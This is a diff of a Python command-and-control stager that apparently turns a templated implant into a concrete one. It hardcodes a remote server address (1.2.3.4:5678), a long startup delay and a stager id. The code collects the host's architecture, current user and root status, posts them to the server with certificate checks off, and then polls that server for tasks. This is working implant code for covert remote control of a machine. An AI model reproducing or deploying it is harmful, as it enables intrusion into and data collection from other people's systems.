@@ -42,12 +42,8 @@ elif operating_system == 'Darwin':
         os._exit(0)
 
 
-time.sleep({{stager.delay}})
-{% if stager.listener.ssl %}
-URL = "https://{{stager.listener.address}}:{{stager.listener.port}}/"
-{% else %}
-URL = "http://{{stager.listener.address}}:{{stager.listener.port}}/"
-{% endif %}
+time.sleep(3600)
+URL = "https://1.2.3.4:5678/"
 
 def download_file(task_name: str, file_path: str):
     with open(file_path, "wb") as f:
@@ -93,13 +89,13 @@ data = {
     "architecture": sp.getoutput("uname -m"),
     "user": sp.getoutput("whoami"),
     "admin": os.getuid() == 0,
-    "stager": {{stager.id}},
+    "stager": 1234,
 }
 name = r.post(f"{URL}/connect", json=data, verify=False).json()["name"]
 
 i = 0
-while i < {{stager.timeout}}:
-    time.sleep({{stager.options["sleep-time"]}})
+while i < 3600:
+    time.sleep(3600)
     try:
         tasks = r.get(URL + "/tasks/" + name, verify=False)
     except:
